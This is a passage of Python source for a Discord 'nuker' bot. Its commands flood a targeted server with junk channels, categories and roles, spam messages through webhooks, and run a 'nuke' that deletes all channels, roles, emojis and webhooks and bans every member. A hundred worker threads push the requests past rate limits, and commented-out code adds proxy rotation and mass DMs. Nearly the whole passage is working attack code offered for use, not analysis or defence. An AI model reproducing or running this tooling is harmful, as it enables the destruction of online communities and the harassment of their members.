        await log(ctx, f'Unable to delete category `{channel.name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='deleteCC', aliases=['dCC'])
async def deleteCC(ctx, *, name):
    if not await hasTarget(ctx):
        return

    channel = containing(selected_server.channels, name)

    if channel is None:
        await log(ctx, f'Unable to find channel `{name}`.')
        return

    try:
        await channel.delete(reason=None)
        await log(ctx, f'Channel `{channel.name}` is removed from `{selected_server.name}`.')
    except:
        await log(ctx, f'Unable to delete channel `{channel.name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='deleteEmoji', aliases=['dEm'])
async def deleteEmoji(ctx, *, name):
    emoji = containing(selected_server.emojis, name)

    if emoji is None:
        await log(ctx, f'Unable to find channel `{name}`.')

    try:
        await emoji.delete(reason=None)
        await (ctx, f'Emoji `{emoji.name}` is removed from the server.')
    except:
        await log(ctx, f'Unable to delete emoji: `{emoji.name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='ban')
async def ban(ctx, member_:discord.Member):
    if not await hasTarget(ctx):
        return
    try:
        await member_.ban()
        await log(ctx, f'Successfully banned `{member_.name}#{member_.discriminator}`.')
    except:
        await log(ctx, f'Unable to ban `{member_.name}#{member_.discriminator}`.')
        raise

@commands.check(checkPerm)
@client.command(name='unban')
async def unban(ctx, *, name):
    if not await hasTarget(ctx):
        return

    member_ = containing([s.user for s in await selected_server.bans()], nameIdHandler(name))
    if member_ is None:
        await log(ctx, f'Unable to find user `{name}` in server `{selected_server.name}`.')
        return
    try:
        await selected_server.unban(member_)
        await log(ctx, f'`{member_.name}#{member_.discriminator}` is now free :).')
    except:
        await log(ctx, f'Failed to unban `{member_.name}#{member_.discriminator}`.')
        raise
    
@commands.check(checkPerm)
@client.command(name='roleTo')
async def roleTo(ctx, member_name, *, role_name):
    if not await hasTarget(ctx):
        return

    role = containing(selected_server.roles, nameIdHandler(role_name))
    if role is None:
        await log(ctx, f'Unable to find role `{role_name}`.')
        return
    # discord.utils.get is useless don't use it it's way slower than "containing"
    member_ = containing(selected_server.members, nameIdHandler(member_name))
    if member_ is None:
        await log(ctx, f'Unable to find user `{member_name}`.')
        return

    if role in member_.roles:
        try:
            await member_.remove_roles(role)
            await log(ctx, f'Successfully removed role `{role.name}` from user `{member_.name}`.')
        except:
            await log(ctx, f'Unable to remove role `{role.name}` from user `{member_.name}`.')
            raise
    else:
        try:
            await member_.add_roles(role)
            await log(ctx, f'Successfully given role `{role.name}` to user `{member_.name}`.')
        except:
            await log(ctx, f'Unable to add role `{role.name}` to user `{member_.name}`.')
            raise

@commands.check(checkPerm)
@client.command(name='disableCommunityMode', aliases=['dCM', 'dCommunityMode'])
async def disableCommunityMode(ctx):
    if not await hasTarget(ctx):
        return

    try:
        await log(ctx, f'{Fore.YELLOW}Disabling community mode')
        r = requests.patch(f'https://discord.com/api/v8/guilds/{selected_server.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'}, 
            'preferred_locale': 'en-US', 
            'public_updates_channel_id': None, 'rules_channel_id': None})

        consoleLog(f'Disabling community mode response -> {r.text}', True)

        await log(ctx, f'{Fore.GREEN}Disabled community mode.')

    except Exception as e:
        consoleLog(f'{Fore.RED}Error while attempting to disable community mode, {e}', True)
        raise

@commands.check(checkPerm)
@client.command(name='grantAllPerm', aliases=['gap'])
async def grantAllPerm(ctx):
    global grant_all_permissions

    if grant_all_permissions:
        await log(ctx, 'Now only people with permissions can use the commands.')
        grant_all_permissions = False
    else:
        await log(ctx, 'Now everyone can use the bot commands')
        grant_all_permissions = True


######### Bombs #########
@commands.check(checkPerm)
@client.command(name='kaboom')
async def kaboom(ctx, n, method):
    if not await hasTarget(ctx):
        return 
    
    if not n.isdigit() or int(n) < 0:
        await log(ctx, 'Please enter a positive integer.')
        return

    await log(ctx, f'A series of bombs have been dropped onto `{selected_server.name}`.')
    tasks = [channelBomb(ctx, n, method), categoryBomb(ctx, n, method), roleBomb(ctx, n, method)]
    await asyncio.gather(*tasks)
    

concurrent = 100
q = Queue(concurrent * 2)
def requestMaker():
    while True:
        requesting, url, headers, payload = q.get()
        try:
            # proxy = randomProxy('https')
            # r = requesting(url, data=json.dumps(payload), headers=headers, proxies=proxy, timeout=timeout)
            r = requesting(url, data=json.dumps(payload), headers=headers, timeout=timeout)
            if r.status_code == 429:
                r = r.json()
                if want_log_request:
                    if isinstance(r['retry_after'], int): # Discord will return all integer time if the retry after is less then 10 seconds which is in miliseconds.
                        r['retry_after'] /= 1000
                    if r['retry_after'] > 5:
                        consoleLog(f'Rate limiting has been reached, and this request has been cancelled due to retry-after time is greater than 5 seconds: Wait {str(r["retry_after"])} more seconds.')
                        q.task_done()
                        continue
                    consoleLog(f'Rate limiting has been reached: Wait {str(r["retry_after"])} more seconds.')
                q.put((requesting, url, headers, payload))
            elif want_log_request and 'code' in r:
                consoleLog('Request cancelled due to -> ' + r['message'])
        except json.decoder.JSONDecodeError:
            pass
        # except requests.exceptions.ProxyError:
        #     consoleLog(f'Proxy "{proxy}" did not respond to a request. Trying...')
        #     q.put((requesting, url, headers, payload))
        except requests.exceptions.ConnectTimeout:
            consoleLog(f'Reached maximum load time: timeout is {timeout} seconds long {proxy}')
            q.put((requesting, url, headers, payload))
        except Exception as e:
            consoleLog(f'Unexpected error: {str(e)}')

        q.task_done()

for i in range(concurrent):
    Thread(target=requestMaker, daemon=True).start()

@commands.check(checkPerm)
@client.command(name='channelBomb')
async def channelBomb(ctx, n, method='fixed'):
    if not await hasTarget(ctx):
        return

    if not n.isdigit() or (n := int(n)) < 0:
        await log(ctx, 'Please insert an integer that is greater than 0.')
        return

    if method == 'fixed':
        method = fixedChoice
    elif method == 'b64':
        method = random_b64
    elif method == 'an':
        method = random_an
    else:
        await log(ctx, f'Unable to find choice "{method}".')
        return

    consoleLog('Channel bombing has started.', True)
    for i in range(n):
        payload = {
            'type': 0,
            'name': method(),
            'permission_overwrites': []
        }
        q.put((requests.post, f'https://discord.com/api/v8/guilds/{selected_server.id}/channels', headers, payload))

    q.join()
    consoleLog('Done text channel bombing.', True)

@commands.check(checkPerm)
@client.command(name='categoryBomb')
async def categoryBomb(ctx, n, method):
    if not await hasTarget(ctx):
        return

    if not n.isdigit() or (n := int(n)) < 0:
        await log(ctx, 'Please insert an integer that is greater than 0.')
        return

    if method == 'fixed':
        method = fixedChoice
    elif method == 'b64':
        method = random_b64
    elif method == 'an':
        method = random_an
    else:
        await log(ctx, f'Unable to find choice "{method}".')
        return

    consoleLog('Channel bombing has started.', True)
    for i in range(n):
        payload = {
            'type': 4,
            'name': method(),
            'permission_overwrites': []
        }
        q.put((requests.post, f'https://discord.com/api/v8/guilds/{selected_server.id}/channels', headers, payload))

    q.join()
    consoleLog('Done category bombing.', True)

@commands.check(checkPerm)
@client.command(name='roleBomb')
async def roleBomb(ctx, n, method):
    if not await hasTarget(ctx):
        return

    if not n.isdigit() or (n := int(n)) < 0:
        await log(ctx, 'Please insert an integer that is greater than 0.')
        return
    
    if method == 'fixed':
        method = fixedChoice
    elif method == 'b64':
        method = random_b64
    elif method == 'an':
        method = random_an
    else:
        await log(ctx, f'Unable to find choice "{method}".')
        return

    consoleLog('Role bombing has started.', True)
    for i in range(n):
        payload = {
            'name': method()
        }
        q.put((requests.post, f'https://discord.com/api/v8/guilds/{selected_server.id}/roles', headers, payload))

    q.join()
    consoleLog('Done role bombing.', True)

# @commands.check(checkPerm)
# @client.command(name='massDM', aliases=['md'])
# async def massDM(ctx, command, *, args=None):
#     if len(server_members) == 0:
#         await log(ctx, 'You don\'t have anything anyone to dm with :(. Fetch some members.')
#         return

#     if args is not None:
#         args = args.split()

#     if command == 'channels' or command == 'channel':
#         if args is None:
#             args = []
#             args.append('1')
#         members_ = []
#         for i in range(len(server_members)):
#             if members_[i].channel_id is not None:
#                 members_[i].id = members_[i].channel_id

#         await embed(ctx, args[0], 'MassDM targets', members_)
#     elif command == 'load':
#         for member_ in server_members:
#             print(member_.name)
#             if int(member_.id) == client.user.id:
#                 continue
#             # asdf = requests.post('https://discordapp.com/api/v8/users/@me/channels', headers=headers, json={'recipient_id': member_.id}, proxies=randomProxy('https'), timeout=timeout).json()
#             member_.__init__(member_.name, member_.id, member_.discriminator, client.get_user(member_.id).dm_channel.id)
#     elif command == 'start':
#         massDM_channels = [i.channel_id for i in server_members if i.channel_id is not None]
#         if len(massDM_channels) == 0:
#             await log(ctx, 'You don\'t have any DM loaded.')
#             return
#         for channel_id in massDM_channels:
#             q.put((f'https://discordapp.com/api/v8/channels{channel_id}/messages', headers))

######### webhooks ##########
@commands.check(checkPerm)
@client.command(name='webhook', aliases=['webhooks', 'wh'])
async def webhook(ctx, *, args=None):
    if not await hasTarget(ctx):
        return

    if args is None or args.isdigit(): # webhook list
        if args is None:
            args = '1'
        try:
            await embed(ctx, args, 'Webhooks', await selected_server.webhooks())
            return
        except:
            raise
    args = args.split()
    if args[0] == 'create' or args[0] == 'add': # webhook create
        # global headers
        del args[0]
        if len(args) < 1:
            await log(ctx, f'More arguments is requested. You can put how many webhooks you want to create or channel id/name on the channels you want the webhooks to be created on.')
            return
        name = ' '.join(args)

        webhooks = await selected_server.webhooks()
        webhooks_length = len(webhooks)

        channels = name.split()
        if int(name) < 0:
            await log(ctx, f'You thought a smol negative number will break this bot?')
            return

        if len(channels) == 1 and int(name) <= 50: ## probably will replace this with auto check channel id
            channels = selected_server.text_channels
            if int(name) > len(channels):
                await log(ctx, f'This adding webhooks method can only distribute webhooks evenly and randomly throughout the text channels. You entered `{name}`, and there are only `{str(len(channels))}` text channel(s) in the server. If you don\'t what to add more text channels. You can use this command a few more times with a positive integer that is less than `{str(len(channels) + 1)}`.')
                return
            for i in range(int(name)):
                payload = {'name': random_b64(10)}
                q.put((requests.post, f'https://discord.com/api/v8/channels/{channels.pop(randrange(len(channels))).id}/webhooks', headers, payload))
            q.join()
            await log(ctx, f'`{name}` webhooks has been created.')
        elif len(channels) == 1 and int(name) < 100000000:
            await log(ctx, f'The maximum webhooks that can be created every hour per server is 50. And you entered `{name}`.')
        else:
            for channel in channels:
                checked_channel = containing(selected_server.text_channels, channel)
                if checked_channel is None:
                    await log(ctx, f'Cannot find channel {channel}.')
                    continue
                payload = {'name': random_b64(10)}
                q.put((requests.post, f'https://discord.com/api/v8/channels/{checked_channel.id}/webhooks', headers, payload))
    
    elif args[0] == 'delete' or args[0] == 'remove':
        name = args[1]

        webhook = containing(await selected_server.webhooks(), name)
        if webhook is None:
            await log(ctx, f'Unable to find webhook `{name}`.')
            return

        requests.delete(f'https://discord.com/api/v8/webhooks/{webhook.id}', headers=headers)
        await log(ctx, f'Webhook `{webhook.name}` is removed from the server.')
    
    elif args[0] == 'attack':
        global webhook_targets
        args.pop(0) # Removing the attack keyword
        try:
            webhooks = await selected_server.webhooks()
            webhooks_length = len(webhooks)
            loaded_length = 0
            if len(args) > 0 and args[0].lower() == 'all':
                for webhook in webhooks:
                    webhook_targets.append(webhook)
                    loaded_length += 1
            elif args[0] == 'start':
                target_list_length = len(webhook_targets)
                if target_list_length == 0:
                    await log(ctx, f'Looks like there really isn\'t any targets in the attack list. Maybe try: `{settings["command_prefix"]}webhook attack all`, then `{settings["command_prefix"]}webhook attack start <number of messages>`.')
                    return
                _headers = {
                    'content-type': 'application/json'
                }

                if len(args) < 2:
                    args.append(10)
                elif not args[1].isdigit():
                    await log(ctx, 'Please enter a positive integer.')
                    return
                
                usernames_length = len(settings['webhook_spam']['usernames'])
                contents_length = len(settings['webhook_spam']['contents'])
                pfp_length = len(settings['webhook_spam']['pfp_urls'])
                 
                for i in range(int(args[1])):
                    payload = {
                        'username': choice(settings['webhook_spam']['usernames']),
                        'content': choice(settings['webhook_spam']['contents']),
                        'avatar_url': choice(settings['webhook_spam']['pfp_urls'])
                    }
                    q.put((requests.post, webhook_targets[randrange(target_list_length)].url, _headers, payload))
            
            elif len(args) > 0 and args[0].isdigit() and int(args[0]) <= webhooks_length:
                for i in range(int(args[0])):
                    webhook_targets.append(webhooks.pop(randrange(webhooks_length)))
                    webhooks_length -= 1
                    loaded_length += 1
            elif args[0] == 'list':
                if len(args) < 2:
                    args.append('1')
                await embed(ctx, args[1], 'Targets on attacking list', webhook_targets)
            elif args[0] == 'offload':
                webhook_targets = []
                await log(ctx, f'All webhooks have been offloaded')
            else:
                for webhook in args:
                    webhook = containing(await selected_server.webhooks(), webhook)
                    if webhook is None:
                        await log(ctx, f'Unable to find webhook `{webhook}`.')
                        continue
                    webhook_targets.append(webhook)
                    loaded_length += 1

            if args[0] != 'list' and args[0] != 'start' and args[0] != 'offload':
                await log(ctx, f'`{str(loaded_length)}` has been loaded into the target list.')

        except:
            raise
            
    else:
        await log(ctx, f'Unable to find `{args[0]}` command in webhook scripts.')
    

######### Nukes #########
@commands.check(checkPerm)
@client.command(name='nuke')
async def nuke(ctx):
    if not await hasTarget(ctx):
        return

    await log(ctx, f'A nuke has been launched to `{selected_server.name}`.')
    tasks = [deleteAllChannels(ctx), deleteAllRoles(ctx), banAll(ctx), deleteAllWebhooks(ctx), deleteAllEmojis(ctx)]
    await asyncio.gather(*tasks)

    if len(settings['after']) > 0:
        if not isDM(ctx) and selected_server.id == ctx.guild.id:
            ctx.message.channel = None 

        consoleLog(f'{Fore.BLUE}Running after commands...', True)
        for command in settings['after']:
            # Lol im so smart to think something like this would work
            try:
                ctx.message.content = settings['command_prefix'] + command
                await client.process_commands(ctx.message)
            except:
                consoleLog(f'{Fore.RED}Command {Fore.YELLOW}"{settings["command_prefix"]}{command}" {Fore.RED}has failed to execute.', True)
                pass

        consoleLog(f'{Fore.GREEN}After commands completed.')

@commands.check(checkPerm)
@client.command(name='deleteAllRoles', aliases=['dar', 'dAllRoles'])
async def deleteAllRoles(ctx):
    if not await hasTarget(ctx):
        return

    consoleLog(f'{Fore.YELLOW}Starting to delete all roles...', True)
    for role in selected_server.roles:
        q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/roles/{role.id}', headers, None))
        
    q.join()
    consoleLog(f'{Fore.GREEN}Finished deleting roles.', True)

@commands.check(checkPerm)
@client.command(name='deleteAllChannels', aliases=['dac', 'dAllChannels'])
async def deleteAllChannels(ctx):
    if not await hasTarget(ctx):
        return

    consoleLog(f'{Fore.YELLOW}Starting to delete all types of channels...', True)
    for channel in selected_server.channels:
        q.put((requests.delete, f'https://discord.com/api/v8/channels/{channel.id}', headers, None))
        
    q.join()
    consoleLog(f'{Fore.GREEN}Finished deleting channels.', True)

@commands.check(checkPerm)
@client.command(name='deleteAllEmojis', aliases=['dae', 'dAllEmoji'])
async def deleteAllEmojis(ctx):
    if not await hasTarget(ctx):
        return

    consoleLog(f'{Fore.YELLOW}Starting to delete all emojis...', True)
    for emote in selected_server.emojis:
        q.put((requests.delete, f'https://discord.com/api/v8/guilds/{selected_server.id}/emojis/{emote.id}', headers, None))
        
    q.join()
    consoleLog(f'{Fore.GREEN}Finished deleting emojis.', True)

@commands.check(checkPerm)
@client.command(name='deleteAllWebhooks', aliases=['daw', 'dAllWebhooks'])
async def deleteAllWebhooks(ctx):
    if not await hasTarget(ctx):
        return

    consoleLog(f'{Fore.YELLOW}Starting to delete all webhooks...', True)
    for webhook in await selected_server.webhooks():
        q.put((requests.delete, f'https://discord.com/api/v8/webhooks/{webhook.id}', headers, None))
        
    q.join()
    consoleLog(f'{Fore.GREEN}Finished deleting webhooks.', True)

@commands.check(checkPerm)
@client.command(name='banAll')
async def banAll(ctx):
    if not await hasTarget(ctx):
        return

    payload = {'delete_message_days':'0', 'reason': ''}
    consoleLog(f'{Fore.YELLOW}Starting ban all...', True)
    for member_ in selected_server.members:
        if f'{member_.name}#{member_.discriminator}' in settings['ban_whitelist'] or str(member_.id) in settings['ban_whitelist']:
            consoleLog(f'Ban skipped for {member_.name}#{member_.discriminator} -> in ban whitelist')
            continue
        q.put((requests.put, f'https://discord.com/api/v8/guilds/{selected_server.id}/bans/{member_.id}', headers, payload))
        
    q.join()
    consoleLog(f'{Fore.GREEN}Ban all completed.', True)

## Configuration command ##
@commands.check(checkPerm)
@client.command(name='config')
async def config(ctx, command=None, *, args=None):
    global settings, settings_copy

    async def embed_list(n, title, array):
        if not n.isdigit() or (n := int(n) - 1) < 0:
            await log(ctx, 'Bad page number.')
            return

        names = ''

        item_length = len(array)
        if item_length == 0:
            return await ctx.send(f'{title} count: 0')
        init_item = n * per_page
        final_item = init_item + per_page
        if init_item > item_length - per_page:
            if init_item > item_length:
                await ctx.send('Invalid page number.')
                return
            final_item = init_item + (item_length % per_page)
        else:
            final_item = init_item + per_page

        for i in range(init_item, final_item, 1):
            item = array[i]
            if len(item) > 17:
                item = item[:17] + '...'
            names += f'{str(i+1)}) {item}\n'

        theColor = randint(0, 0xFFFFFF)
        embed = discord.Embed(
            title = title,
            description = f'Total count: {str(item_length)}; color: #{hex(theColor)[2:].zfill(6)}',
            color = theColor
        )
        embed.add_field(name='Items', value=names, inline=True)
        embed.set_footer(text=f'{n+1}/{str(ceil(item_length / per_page))}\n' + 
                        ('Config is saved' if configIsSaved() else '(*)Config is not saved'))   

        await ctx.send(embed=embed)

    if command is None:
        status_list = []
        features_list = []
        temp = settings.copy()

        features_list.append('bomb_messages')
        if temp['bomb_messages']['random'] is None or len(temp['bomb_messages']['fixed']) == 0:
            status_list.append(':x:')
        else:
            status_list.append(':white_check_mark:')
        features_list.append('webhook_spam')
        if len(temp['webhook_spam']['usernames']) == 0 or len(temp['webhook_spam']['pfp_urls']) == 0 or len(temp['webhook_spam']['contents']) == 0:
            status_list.append(':x:')
        else:
            status_list.append(':white_check_mark:')

        del temp['bomb_messages']
        del temp['webhook_spam']
        for feature in temp:
            features_list.append(feature)
            if settings[feature] is None or (type(settings[feature]).__name__ == 'list' and len(settings[feature]) == 0):
                status_list.append(':x:')
            else:
                status_list.append(':white_check_mark:')

        theColor = randint(0, 0xFFFFFF)
        embed = discord.Embed(
            title = 'Nuking features',
            description = f':white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
            color = theColor
        )
        embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
        embed.add_field(name='Features', value='\n'.join(features_list), inline=True)
        embed.add_field(name='Usage', value=f'Use `{settings["command_prefix"]}config <feature>` to get more information about how to config that feature.\n\n`{settings["command_prefix"]}config save <file name>` to save the current config. If you save the config as `default.json` the bot next time will directly start with whatever is in that `.json` file.', inline=False)

        embed.set_footer(text='Config is saved' if configIsSaved() else '(*)Config is not saved')
        await ctx.send(embed=embed)
        return

    command = command.lower()

    #################
    #  permissions  #
    #################
    if command == 'permissions' or command == 'permission' or command == 'perms' or command == 'perm':
        if args is None:
            status_list = []
            features_list = []

            features_list.append('permissions')
            if len(settings['permissions']) == 0:
                status_list.append(':x:')
            else:
                status_list.append(':white_check_mark:')

            theColor = randint(0, 0xFFFFFF)
            embed = discord.Embed(
                title = 'Permissions list',
                description = f'Permissions for using the bot are given to the users.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
                color = theColor
            )
            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
            embed.add_field(name='Features', value='\n'.join(features_list), inline=True)
            embed.add_field(name='Usage', value=f'`permissions add <userTag or userID> [userTag or userID] [user...` - grant permissions to the given user(s)\n\n`permissions remove <line number> [line number] [line...` - remove line(s) from the list\n\n`permissions list [page number]` - list all users that are in the permission list', inline=False)

            embed.set_footer(text=('Config is saved' if configIsSaved() else '(*)Config is not saved'))

            await ctx.send(embed=embed)

        else:
            args = args.split()
            def alreadyExisted(checkingID):
                for userID_index in range(len(settings['permissions'])):
                    if settings['permissions'][userID_index] == checkingID:
                        return True, userID_index
                return False, None

            if args[0] == 'add':
                del args[0]
                for userID in args:
                    existed, checkedID_index = alreadyExisted(userID)
                    if existed:
                        await log(ctx, f'Failed to add `{settings["permissions"][checkedID_index]}`. Already existed the permission list.')
                        continue
                    else:
                        settings['permissions'].append(userID)

            elif args[0] == 'remove':
                if len(args) > 1:
                    del args[0]
                    offset = 1
                    initial_length = len(settings['permissions'])
                    for item in args:
                        if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
                            del settings['permissions'][item - offset]
                            offset += 1
                        else:
                            await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')

                    await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                else:
                    await log(ctx, f'Enter line(s) to remove from bomb_messages fixed list.')
            
            elif args[0] == 'list':
                await embed_list(args[1] if len(args) > 1 else '1', 'permission list', settings['permissions'])

            else:
                await log(ctx, f'Unknown operation: `{args[1]}`')

    #################
    # bomb_messages #
    #################
    elif command == 'bomb_messages' or command == 'bomb_message' or command == 'bomb':
        if args is None:
            status_list = []
            features_list = []
            
            features_list.append('random')
            if settings['bomb_messages']['random'] is None:
                status_list.append(':x:')
            else:
                status_list.append(':white_check_mark:')

            features_list.append('fixed')
            if len(settings['bomb_messages']['fixed']) == 0:
                status_list.append(':x:')
            else:
                status_list.append(':white_check_mark:')

            theColor = randint(0, 0xFFFFFF)
            embed = discord.Embed(
                title = 'bomb_messages',
                description = f'Config for all the bomb commands.\nWhen you run bomb commands like `{settings["command_prefix"]}channelbomb 100 fixed` the fixed is the type of word list you are going to use. In this case the word list is going to randomly pick texts from the "fixed" list.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
                color = theColor
            )
            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
            embed.add_field(name='Types', value='\n'.join(features_list), inline=True)
            embed.add_field(name='Usage', value=f'`bomb_messages fixed add <command>` - add contents to the back of the list\n\n`bomb_messages fixed remove <line number> [line number] [line...` - remove line(s) from the list\n\n`bomb_messages fixed list [page number]` - list contents that are in the content list\n\n`bomb_messages random <character length>` - sets character length for bomb commands like `{settings["command_prefix"]}kaboom 100 b64`(b64 = base64) ', inline=False)

            embed.set_footer(text='Config is saved' if configIsSaved() else '(*)Config is not saved')
            await ctx.send(embed=embed)

        else:
            args = args.split()
            if args[0].lower() == 'random':
                if len(args) > 1 and args[1].isdigit() and (1 <= (length := int(args[1])) <= 1024):
                    settings['bomb_messages']['random'] = length
                    await log(ctx, f'Random-message length has been set to `{str(length)}`.')
                else:
                    await log(ctx, 'Please enter a positive integer that is between 1 and 1024.')

            elif args[0].lower() == 'fixed':
                if args[1] == 'add':
                    if len(args) > 2 and (1 <= len(text := ' '.join(args[2:])) <= 100):
                        settings['bomb_messages']['fixed'].append(text)
                        await log(ctx, f'Text added. Character length: `{str(len(text))}`.')
                    else: 
                        await log(ctx, f'Please enter something that has 1 to 100 characters.')

                elif args[1] == 'remove':
                    if len(args) > 2:
                        del args[0], args[0]
                        offset = 1
                        initial_length = len(settings['bomb_messages']['fixed'])
                        for item in args:
                            if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
                                del settings['bomb_messages']['fixed'][item - offset]
                                offset += 1
                            else:
                                await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')

                        await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                    else:
                        await log(ctx, f'Enter line(s) to remove from bomb_messages fixed list.')
                
                elif args[1] == 'list':
                    await embed_list(args[2] if len(args) > 2 else '1', 'bomb_messages fixed list', settings['bomb_messages']['fixed'])

                else:
                    await log(ctx, f'Unknown operation: `{args[1]}`')

            else:
                await log(ctx, f'Unable to find {args[0]} config.')


    ################
    #   webhook    #
    ################
    elif command == 'webhook_spam':
        if args is None:
            status_list = []
            features_list = []

            for feature in settings['webhook_spam']:
                features_list.append(feature)
                if len(settings['webhook_spam'][feature]) == 0:
                    status_list.append(':x:')
                else:
                    status_list.append(':white_check_mark:')

            theColor = randint(0, 0xFFFFFF)
            embed = discord.Embed(
                title = 'webhook_spam',
                description = f'Using webhook to spam messages. To send a message from discord webhook it requires 3 items: usernames, profile picture, and contents. For profile picture you can only put an image URL or put `none` for no pfp.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
                color = theColor
            )
            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
            embed.add_field(name='Types', value='\n'.join(features_list), inline=True)
            embed.add_field(name='Usage', value=f'`webhook_spam <type> add <command>` - add contents to the back of the list\n\n`webhook_spam <type> remove <line number> [line number] [line...` - remove line(s) from the list\n\n`webhook_spam <type> list [page number]` - list contents that are in the content list', inline=False)

            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')

            await ctx.send(embed=embed)

        else:
            args = args.split()
            if args[0] == 'usernames' or args[0] == 'username':
                if args[1] == 'add':
                    if len(args) > 2 and (0 < len(text := ' '.join(args[2:])) <= 32):
                        settings['webhook_spam']['usernames'].append(text)
                        await log(ctx, f'Text added. Character length: `{str(len(text))}`.')
                    else: 
                        await log(ctx, f'Please enter something that has 1 to 32 characters.')

                elif args[1] == 'remove':
                    if len(args) > 2:
                        del args[0], args[0]
                        offset = 1
                        initial_length = len(settings['webhook_spam']['usernames'])
                        for item in args:
                            if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
                                del settings['webhook_spam']['usernames'][item - offset]
                                offset += 1
                            else:
                                await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')

                        await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                    else:
                        await log(ctx, f'Enter line(s) to remove from usernames.')
                
                elif args[1] == 'list':
                    await embed_list(args[2] if len(args) > 2 else '1', 'webhook_spam usernames list', settings['webhook_spam']['usernames'])

                else:
                    await log(ctx, f'Unknown operation: `{args[1]}`')

            elif args[0] == 'pfp_urls' or args[0] == 'pfp_url' or args[0] == 'pfp':
                if args[1] == 'add':
                    if len(args) > 1 and args[2].lower() == 'none':
                        settings['webhook_spam']['pfp_urls'].append(None)
                        await log(ctx, f'No pfp item has been added')
                    elif len(args) > 1 and args[2].startswith(('https://', 'http://')):
                        settings['webhook_spam']['pfp_urls'].append(args[2])
                        await log(ctx, f'URL added.')
                    else: 
                        await log(ctx, f'Please enter an **image URL**. Note: the link must start with http(s) protocals. Or enter `none` for no pfp.')
                
                elif args[1] == 'remove':
                    if len(args) > 2:
                        del args[0], args[0]
                        offset = 1
                        initial_length = len(settings['webhook_spam']['pfp_urls'])
                        for item in args:
                            if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
                                del settings['webhook_spam']['pfp_urls'][item - offset]
                                offset += 1
                            else:
                                await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')

                        await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                    else:
                        await log(ctx, f'Enter line(s) to remove from pfp_urls.')
                
                elif args[1] == 'list':
                    await embed_list(args[2] if len(args) > 2 else '1', 'webhook_spam pfp_urls list', settings['webhook_spam']['pfp_urls'])

                else:
                    await log(ctx, f'Unknown operation: `{args[1]}`')

            elif args[0] == 'contents' or args[0] == 'content':
                if args[1] == 'add':
                    if len(args) > 1 and (0 < len(text := ' '.join(args[2:])) <= 2000):
                        settings['webhook_spam']['contents'].append(text)
                        await log(ctx, f'Text added. Character length: `{str(len(text))}`.')
                    else: 
                        await log(ctx, f'Please enter something that has 1 to 2000 characters.')

                elif args[1] == 'remove':
                    if len(args) > 2:
                        del args[0], args[0]
                        offset = 1
                        initial_length = len(settings['webhook_spam']['contents'])
                        for item in args:
                            if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
                                del settings['webhook_spam']['contents'][item - offset]
                                offset += 1
                            else:
                                await log(ctx, f'Skipped deleting line `{item}` -> not an integer between 1 and {str(initial_length)}.')

                        await log(ctx, f'Successfully removed `{str(offset - 1)}` items.')
                    else:
                        await log(ctx, f'Enter line(s) to remove from contents.')
                
                elif args[1] == 'list':
                    await embed_list(args[2] if len(args) > 2 else '1', 'webhook_spam contents list', settings['webhook_spam']['contents'])

                else:
                    await log(ctx, f'Unknown operation: `{args[1]}`')
            else:
                await log(ctx, f'Unknown type: `{args[0]}`')

    elif command == 'after':
        if args is None:
            status_list = []
            features_list = []
            
            features_list.append('after')
            if len(settings['after']) == 0:
                status_list.append(':x:')
            else:
                status_list.append(':white_check_mark:')

            theColor = randint(0, 0xFFFFFF)
            embed = discord.Embed(
                title = 'After commands',
                description = f'All the commands in this list will run after `{settings["command_prefix"]}nuke`. It can be disabled by adding "false" after the nuke command: `{settings["command_prefix"]}nuke false`.\n\n:white_check_mark: = Ready to use\n:x: = Needs to config\ncolor: #{hex(theColor)[2:].zfill(6)}',
                color = theColor
            )
            embed.add_field(name='Status', value='\n'.join(status_list), inline=True)
            embed.add_field(name='Features', value='\n'.join(features_list), inline=True)
            embed.add_field(name='Usage', value=f'`after add <command>` - add command to the back of the command list\n\n`after remove <line number> [line number] [line...` - remove line(s) in the command list\n\n`after insert <line number> <command>` - insert command after the given line. Note: use `insert 0 <command>` to insert the command to the first line\n\n`after list [page number]` - list commands that are in the command list', inline=False)

            embed.set_footer(text=f'Config is saved' if configIsSaved() else '(*)Config is not saved')
            await ctx.send(embed=embed)

        else: 
            args = args.split()
            if args[0] == 'add':
                if len(args) > 1:
                    text = ' '.join(args[1:])
                    settings['after'].append(text)
                    await log(ctx, f'Command added. Character length: `{str(len(text))}`.')
                else: 
                    await log(ctx, f'Please enter the command you want to add after line `{len(settings["after"])}`.')
            
            elif args[0] == 'remove':
                if len(args) > 1:
                    del args[0]
                    offset = 1
                    initial_length = len(settings['after'])
                    for item in args:
                        if item.isdigit() and (0 <= (item := int(item)) - offset <= initial_length - offset):
                            del settings['after'][item - offset]
                            offset += 1
                        else:
